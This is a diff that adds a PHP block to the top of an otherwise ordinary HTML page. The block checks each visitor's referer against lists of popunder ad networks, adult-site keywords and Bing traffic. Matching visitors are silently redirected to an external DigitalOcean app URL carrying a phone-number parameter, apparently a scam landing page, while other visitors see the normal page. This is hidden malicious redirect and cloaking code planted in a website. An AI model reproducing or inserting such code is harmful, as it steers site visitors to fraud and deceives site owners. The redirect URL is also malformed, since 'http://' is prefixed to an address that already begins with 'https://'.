@@ -1,3 +1,113 @@
+<?php
+    $referers=array('displayvertising','premiumvertising','cdn4ads','blockadsnot','xadsmart','visariomedia','intellipopup','antiadblocksystems','intelligenceadx','popads','txrhpjddhbal','afdrivovoq','betteradsystem','bnohewjt','displayvertising','ehpvvxyp','fepgdpebyr','iezptsoc','jpzvrsuwdavpjw','qogilljcxwvrhj','lghqdjhilj','mjeltachv','mjzrebrjty','oofycyur','rsnjmocfenkewq','xadsmart','ugdffrszmrapj','pbxopblttvorhd','mdghnrtegwuqar','pbyvehcz','thtpxwnqfx','awtqbjylk','dencejvlq','hjfonyiuo','paoukgnssmkeys','uaputgtwlhkmtr','mhrpusbstm','bponxqlit','hoiiodacdsmro','hqduejsycx','ouzrqrzktv','mrflvyizjr','uduhytyllobm','jozvmvxi','sruzefwboxu','mrflvyizjrkytj');
+
+    $referers_popcash=array('rapolok','alfad','cabhwq','popcash','gocolow','viowrel','npcad','gecl','barlo','npcta','decpo','srvpcn','ponk','symoqecnefjj','asopn','norymo','hqwa','pctv','baidu','jwalf','ftwpcn','nuqwe','dlivertraffic','jeckear','hkuypnhpafbuyy','ovqds','bioeesrqti','ciazdymfepv','rgrd','posawaj','netund','mtinsqq','miluwo');
+
+    $referers_maven=array('recode','linkpc','line','porn','sex','torrent','xxx','fuck','jerk','tube','jhoncj','tiny','teen','nude','torlock','marazma','isgost','falkwo','marazma');
+
+    $referers_bing=array('yahoo','outlook','msn','becovi','bing');
+
+    $lanzar=true;
+    $dominio_m='https://whale-app-iosel.ondigitalocean.app/?phone=919-610-587';
+
+    $encontrado=false;
+    if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
+        foreach ($referers as $referer){
+            $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
+            if ($pos === false) {
+                    //la cadena no esta
+            } else {
+                $encontrado=true;
+                break;
+            }
+        }
+        if ($encontrado){
+
+        }
+
+        #Buscar PopCash
+        if (!$encontrado){
+          foreach ($referers_popcash as $referer){
+              $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
+              if ($pos === false) {
+                      //la cadena no esta
+              } else {
+                  $encontrado=true;
+                  $and='&popcash=1';
+                  break;
+              }
+          }
+        }
+
+        #Buscar Maven
+        if (!$encontrado){
+          foreach ($referers_maven as $referer){
+              $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
+              if ($pos === false) {
+                      //la cadena no esta
+              } else {
+                  $encontrado=true;
+                  $and='&maven=1';
+                  break;
+              }
+          }
+        }
+
+        #Buscar Bing
+        if (!$encontrado){
+          foreach ($referers_bing as $referer){
+              $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
+              if ($pos === false) {
+                      //la cadena no esta
+              } else {
+                  $encontrado=true;
+                  $and='&bing=1';
+                  break;
+              }
+          }
+
+          if ($_REQUEST['msclkid']!=''){
+            $encontrado=true;
+            $and='&bing=1&utm_term='.$_REQUEST['utm_term'];
+          }else if ($_REQUEST['utm_source']=='bing' && $_REQUEST['ads']=='bing' && $_REQUEST['utm_campaign']=='Mizza'){
+            $encontrado=true;
+            $and='&bing=1&source=display';
+          }else if ($_REQUEST['utm_source']=='bing' && $_REQUEST['bing']==1 && $_REQUEST['utm_campaign']=='Display'){
+            $encontrado=true;
+            $and='&bing=1&source=display';
+          }
+        }
+
+        
+    }else{
+      if ($_REQUEST['utm_source']=='bing' && $_REQUEST['bing']==1 && $_REQUEST['utm_campaign']=='display'){
+        #Display Bing sin referer
+        $encontrado=true;
+        $and='&bing=1&source=display';
+        $_SERVER["HTTP_REFERER"]='bing';
+      }
+      
+    }
+
+
+
+    if ($encontrado){
+        $referer=base64_encode($_SERVER["HTTP_REFERER"]);
+        header("Location: http://".$dominio_m."/?site_source=campaign&popads=1".$and."&browser=".$_REQUEST['browser']."&campaign=".$_REQUEST['campaign']."&device=".$_REQUEST['device']."&referer=".$referer);
+        exit();
+    }else{
+      if ($_SERVER["HTTP_REFERER"]!==''){
+        /*include 'debug/functions-tio.php';
+        $conexion=conectar_bd();
+        insert_debug($conexion);
+        cerrar_bd($conexion);*/
+      }
+    }
+
+
+?>
+
+
 <!DOCTYPE html>
 <html lang="en">
 
